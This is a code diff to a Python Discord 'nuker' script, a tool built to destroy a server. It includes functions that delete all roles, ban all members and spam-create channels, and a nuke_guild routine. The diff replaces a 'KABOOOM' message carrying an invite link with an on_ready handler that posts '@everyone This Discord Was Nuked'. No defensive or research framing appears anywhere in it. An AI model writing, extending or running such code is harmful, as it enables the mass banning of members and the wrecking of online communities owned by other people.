@@ -16,7 +16,7 @@ clear = lambda: system('cls') if os_name == 'nt' else system('clear')
 def _input(text):print(text, end='');return input()
 
 baner = f'''
- _   _       _
+_   _       _
 | \ | |_   _| | _____ _ __
 |  \| | | | | |/ / _ \ '__|
 | |\  | |_| |   <  __/ |
@@ -45,14 +45,6 @@ async def delete_all_roles(guild):
             continue
     return deleted
 
-async def on_ready():
-    guild = client.get_guild(GUILD_ID)
-    
-
-    for member in guild.members:
-        print(f'{member.name}' + f'#{member.discriminator}')
-        
-    print(len(guild.members))
 async def ban_all_members(guild):
     banned = 0
     for member in guild.members:
@@ -82,10 +74,13 @@ async def create_text_channels(guild, name):
             await guild.create_text_channel(name=name)
             created += 1
         except:
-            pass
-    await ctx.guild.create_text_channel('nuked')
-    channel = discord.utils.get(client.get_all_channels(), guild=ctx.author.guild, name='nuked')
-    await channel.send("KABOOOM\ndiscord.gg/VMXyEHtMPj")
+            continue
+    return created
+
+async def on_ready():  #Called when internal cache is loaded
+
+    channel = client.get_channel(channel_id) #  Gets channel from internal cache
+    await channel.send("@everyone This Discord Was Nuked") #  Sends message to channel
 
 
 async def nuke_guild(guild):
@@ -101,7 +96,7 @@ async def nuke_guild(guild):
     #created_roles = await created_roles(guild,name)
     #print(f'{m}Create Roles:{b}{created_roles}')
     print(f'{r}--------------------------------------------\n\n')
- 
+
 
 while True:
     clear()
